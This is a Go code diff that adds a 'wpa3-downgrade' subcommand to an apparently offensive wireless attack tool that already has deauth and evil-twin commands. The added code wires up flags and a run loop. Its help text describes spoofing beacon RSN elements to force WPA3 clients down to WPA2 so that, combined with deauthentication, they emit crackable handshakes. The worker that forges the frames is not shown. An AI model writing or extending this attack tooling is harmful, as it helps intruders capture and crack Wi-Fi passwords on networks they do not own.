@@ -596,6 +596,7 @@ func init() {
 	eviltwinCmd.AddCommand(eviltwinV1Cmd)
 	eviltwinCmd.AddCommand(eviltwinV2Cmd)
 	eviltwinCmd.AddCommand(eviltwinV3Cmd)
+	rootCmd.AddCommand(wpa3DowngradeCmd)
 }
 
 var deauthCmd = &cobra.Command{
@@ -622,6 +623,43 @@ var deauthCmd = &cobra.Command{
 			fmt.Printf("[-] deauth failed: %v\n", err)
 			os.Exit(1)
 		}
+	},
+}
+
+func init() {
+	wpa3DowngradeCmd.Flags().Int("channel", 6, "802.11 channel for spoofed beacons")
+	wpa3DowngradeCmd.Flags().Int("duration", 0, "seconds to run (0 = until Ctrl+C)")
+}
+
+var wpa3DowngradeCmd = &cobra.Command{
+	Use:   "wpa3-downgrade <iface> <bssid> <ssid>",
+	Short: "Poison RSN IE to force WPA3→WPA2 transition for handshake capture",
+	Long:  "Spoofs beacon RSN IE advertising WPA2-PSK/CCMP instead of WPA3-SAE. " +
+		"Run alongside a deauth loop; clients that support both downgrade and emit " +
+		"crackable WPA2 4-way handshakes.",
+	Args: cobra.ExactArgs(3),
+	Run: func(cmd *cobra.Command, args []string) {
+		iface, bssid, ssid := args[0], args[1], args[2]
+		ch, _ := cmd.Flags().GetInt("channel")
+		duration, _ := cmd.Flags().GetInt("duration")
+		worker := NewWPA3Downgrade(iface, bssid, ssid, ch)
+		if err := worker.Run(); err != nil {
+			fmt.Printf("[-] downgrade failed: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Printf("[+] WPA3 downgrade running on ch%d — sent=%d frames so far\n", ch, worker.Sent())
+		sig := make(chan os.Signal, 1)
+		signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
+		if duration > 0 {
+			select {
+			case <-sig:
+			case <-time.After(time.Duration(duration) * time.Second):
+			}
+		} else {
+			<-sig
+		}
+		worker.Stop_()
+		fmt.Printf("[+] stopped — total beacons sent: %d bytes\n", worker.Sent())
 	},
 }
 
